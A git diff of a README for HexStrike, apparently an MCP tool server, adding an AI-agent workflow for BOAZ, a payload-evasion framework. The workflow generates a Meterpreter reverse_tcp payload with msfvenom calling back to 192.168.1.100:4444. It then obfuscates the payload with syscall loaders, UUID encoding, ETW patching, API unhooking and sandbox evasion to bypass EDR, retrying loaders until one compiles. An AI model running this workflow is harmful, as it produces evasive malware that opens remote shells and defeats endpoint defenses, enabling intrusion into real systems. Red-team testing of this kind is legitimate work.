@@ -532,32 +532,68 @@ HexStrike now includes **BOAZ**, an advanced payload evasion framework for red t
 
 ### BOAZ MCP Tools
 
+**Critical Workflow** (files MUST be in BOAZ_beta directory):
+
 ```python
-# Generate evasive payload with maximum evasion
-boaz_generate_payload(
-    input_file="beacon.exe",
-    output_file="output/evasive.exe",
-    loader=51,              # Memory guard loader
-    encoding="aes",         # AES encryption
-    compiler="akira",       # LLVM obfuscation
-    etw=True,               # ETW patching
-    api_unhooking=True,     # API unhooking
-    anti_emulation=True,    # Sandbox evasion
-    entropy=2               # Entropy reduction
+# STEP 1: Ask user what type of evasion they need
+# User: "I need to bypass EDR userland hooks"
+
+# STEP 2: List syscall loaders (bypass EDR hooks)
+boaz_list_loaders(category="syscall")
+# Returns loaders 1-11 with direct syscall techniques
+
+# STEP 3: Generate initial payload with MSFVenom
+msfvenom_scan(
+    payload="windows/x64/meterpreter/reverse_tcp",
+    lhost="192.168.1.100",
+    lport=4444,
+    output="payload.exe"  # Creates payload.exe
 )
 
+# STEP 4: Move payload to BOAZ_beta directory (REQUIRED!)
+# Run this manually: cp payload.exe BOAZ_beta/
+
+# STEP 5: Apply BOAZ evasion with appropriate loader
+result = boaz_generate_payload(
+    input_file="payload.exe",          # File inside BOAZ_beta/
+    output_file="output/evasive.exe",  # Will be in BOAZ_beta/output/
+    loader=3,                           # Sifu Syscall (direct syscall)
+    encoding="uuid",                    # UUID encoding
+    anti_emulation=True,                # Evade sandboxes
+    etw=True,                           # ETW patching
+    api_unhooking=True,                 # API unhooking
+    sleep=True                          # Sleep evasion
+)
+
+# STEP 6: Check if compilation succeeded
+# If result['success'] == False, try a different loader from the same category
+# Result: BOAZ_beta/output/evasive.exe (~500KB, heavily obfuscated)
+```
+
+**Other BOAZ Tools:**
+
+```python
 # List available loaders by category
 boaz_list_loaders(category="stealth")
 
 # Analyze binary entropy
-boaz_analyze_binary(file_path="output/payload.exe")
+boaz_analyze_binary(file_path="payload.exe")  # Must be in BOAZ_beta/
 
 # List encoding schemes
 boaz_list_encoders()
 
 # Validate configuration
-boaz_validate_options(loader=51, encoding="aes")
+boaz_validate_options(loader=16, encoding="uuid")
 ```
+
+**Important Notes:**
+- Choose loader based on evasion requirements, not reliability
+- Some loaders may fail compilation with newer mingw - try alternatives
+- Use `boaz_list_loaders(category="...")` to browse loaders by technique
+- ALL file paths are relative to BOAZ_beta directory
+- Input files MUST be inside BOAZ_beta/ (security requirement)
+- Output files go to BOAZ_beta/output/
+- Check `result['success']` after generation to verify compilation
 
 ### Loader Categories
 
